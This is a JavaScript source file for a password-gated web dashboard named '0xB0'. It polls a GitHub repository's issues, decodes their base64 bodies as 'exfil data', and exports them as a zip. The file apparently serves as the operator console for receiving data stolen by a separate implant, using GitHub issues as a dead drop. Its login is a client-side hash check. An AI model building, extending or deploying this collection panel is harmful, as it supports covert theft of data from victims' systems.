(function() {
    'use strict';

    const HASH_USER = '0ca1574299693aaeb821647cf4c897a153bea29fafb12db28257a1ed61ce58d0';
    const HASH_PASS = '7ef461cec5e3f823e0724d62cb57b46e875a8690f1c1917c4d773cb2cb5a86ed';
    const REPO = 'va1uxxx/0xB0';
    const API_URL = `https://api.github.com/repos/${REPO}/issues`;

    function getElements() {
        const loginPage = document.getElementById('loginPage');
        const dashboardPage = document.getElementById('dashboardPage');
        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginError = document.getElementById('loginError');
        const logContainer = document.getElementById('logContainer');
        const refreshBtn = document.getElementById('refreshBtn');
        const logoutBtn = document.getElementById('logoutBtn');
        const downloadBtn = document.getElementById('downloadBtn');
        return { loginPage, dashboardPage, loginForm, usernameInput, passwordInput, loginError, logContainer, refreshBtn, logoutBtn, downloadBtn };
    }

    async function hashString(str) {
        try {
            const encoder = new TextEncoder();
            const data = encoder.encode(str);
            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        } catch {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return Math.abs(hash).toString(16).padStart(64, '0');
        }
    }

    const SESSION_KEY = '0xB0_auth';

    function isLoggedIn() {
        return sessionStorage.getItem(SESSION_KEY) === 'true';
    }

    function setLoggedIn(state) {
        sessionStorage.setItem(SESSION_KEY, state ? 'true' : 'false');
    }

    function showDashboard() {
        const els = getElements();
        if (!els.loginPage || !els.dashboardPage) {
            console.error('Elements missing.');
            return;
        }
        els.loginPage.style.display = 'none';
        els.dashboardPage.style.display = 'block';
        fetchExfilData();
        if (window._refreshInterval) clearInterval(window._refreshInterval);
        window._refreshInterval = setInterval(fetchExfilData, 30000);
    }

    function showLogin() {
        const els = getElements();
        if (!els.loginPage || !els.dashboardPage) {
            console.error('Elements missing.');
            return;
        }
        els.loginPage.style.display = 'block';
        els.dashboardPage.style.display = 'none';
        if (window._refreshInterval) {
            clearInterval(window._refreshInterval);
            window._refreshInterval = null;
        }
        if (els.usernameInput) els.usernameInput.value = '';
        if (els.passwordInput) els.passwordInput.value = '';
        if (els.loginError) els.loginError.textContent = '';
    }

    async function fetchExfilData() {
        const els = getElements();
        if (!els.logContainer) return;
        const placeholder = `<div class="placeholder"><i class="fas fa-spinner spinner"></i> FETCHING DATA...</div>`;
        els.logContainer.innerHTML = placeholder;
        try {
            const response = await fetch(API_URL, {
                headers: { 'Accept': 'application/vnd.github.v3+json' }
            });
            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            const issues = await response.json();
            if (!Array.isArray(issues) || issues.length === 0) {
                els.logContainer.innerHTML = `<div class="placeholder"><i class="fas fa-inbox"></i> NO DATA RECEIVED</div>`;
                return;
            }
            const openIssues = issues.filter(i => i.state === 'open');
            if (openIssues.length === 0) {
                els.logContainer.innerHTML = `<div class="placeholder"><i class="fas fa-check-circle"></i> ALL CLEAR</div>`;
                return;
            }
            const sorted = openIssues.slice().reverse();
            let html = '';
            sorted.forEach((issue) => {
                const title = escapeHtml(issue.title || 'Untitled');
                const time = new Date(issue.created_at).toLocaleString();
                let body = issue.body || '';
                let decoded = '';
                let isTruncated = false;
                try {
                    decoded = atob(body);
                } catch {
                    decoded = body;
                }
                if (decoded.length > 2500) {
                    isTruncated = true;
                    decoded = decoded.substring(0, 2500);
                }
                const displayBody = escapeHtml(decoded);
                const truncatedMark = isTruncated ? ' <span style="color:#4a5a6a;">… (truncated)</span>' : '';
                html += `
                    <div class="entry">
                        <div class="entry-header">
                            <span class="entry-title"><i class="fas fa-file-alt" style="color:#4a5a6a;margin-right:8px;"></i>${title}</span>
                            <span class="entry-time"><i class="far fa-clock"></i> ${time}</span>
                        </div>
                        <div class="entry-body">
                            ${displayBody}${truncatedMark}
                        </div>
                        <div style="text-align:right;margin-top:6px;">
                            <button class="copy-btn" data-copy="${escapeHtml(decoded)}"><i class="fas fa-copy"></i> COPY</button>
                        </div>
                    </div>
                `;
            });
            els.logContainer.innerHTML = html;

            document.querySelectorAll('.copy-btn').forEach(btn => {
                btn.addEventListener('click', function() {
                    const text = this.getAttribute('data-copy');
                    navigator.clipboard.writeText(text).then(() => {
                        const original = this.innerHTML;
                        this.innerHTML = '<i class="fas fa-check"></i> COPIED';
                        setTimeout(() => { this.innerHTML = original; }, 1500);
                    }).catch(() => {});
                });
            });

        } catch (err) {
            els.logContainer.innerHTML = `<div class="error-msg"><i class="fas fa-triangle-exclamation"></i> ERROR: ${escapeHtml(err.message)}</div>`;
        }
    }

    function escapeHtml(str) {
        if (!str) return '';
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        };
        return str.replace(/[&<>"']/g, function(m) { return map[m]; });
    }

    function downloadZip() {
        const els = getElements();
        if (!els.logContainer) return;
        const entries = els.logContainer.querySelectorAll('.entry');
        if (entries.length === 0) {
            alert('No data to download.');
            return;
        }
        const zip = new JSZip();
        entries.forEach((entry, idx) => {
            const bodyDiv = entry.querySelector('.entry-body');
            if (bodyDiv) {
                const text = bodyDiv.textContent.trim();
                const fileName = `entry_${idx+1}.txt`;
                zip.file(fileName, text);
            }
        });
        zip.generateAsync({ type: 'blob' }).then(function(content) {
            const link = document.createElement('a');
            link.href = URL.createObjectURL(content);
            link.download = `0xB0_exfil_${new Date().toISOString().slice(0,10)}.zip`;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            URL.revokeObjectURL(link.href);
        });
    }

    function init() {
        const els = getElements();
        if (!els.loginForm || !els.usernameInput || !els.passwordInput || !els.loginError) {
            console.error('Required login elements missing.');
            return;
        }

        els.loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            const user = els.usernameInput.value.trim();
            const pass = els.passwordInput.value.trim();

            if (user === '' || pass === '') {
                els.loginError.textContent = 'ENTER CREDENTIALS';
                return;
            }

            const hashUser = await hashString(user);
            const hashPass = await hashString(pass);

            if (hashUser === HASH_USER && hashPass === HASH_PASS) {
                setLoggedIn(true);
                els.loginError.textContent = '';
                showDashboard();
            } else {
                els.loginError.textContent = 'ACCESS DENIED';
                els.usernameInput.value = '';
                els.passwordInput.value = '';
                els.usernameInput.focus();
            }
        });

        if (els.logoutBtn) {
            els.logoutBtn.addEventListener('click', function() {
                setLoggedIn(false);
                showLogin();
            });
        }

        if (els.refreshBtn) {
            els.refreshBtn.addEventListener('click', function() {
                this.innerHTML = '<i class="fas fa-spinner spinner"></i>';
                fetchExfilData().finally(() => {
                    this.innerHTML = '<i class="fas fa-sync-alt"></i> Refresh';
                });
            });
        }

        if (els.downloadBtn) {
            els.downloadBtn.addEventListener('click', downloadZip);
        }

        if (isLoggedIn()) {
            showDashboard();
        } else {
            showLogin();
        }

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape' && isLoggedIn()) {
                setLoggedIn(false);
                showLogin();
            }
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
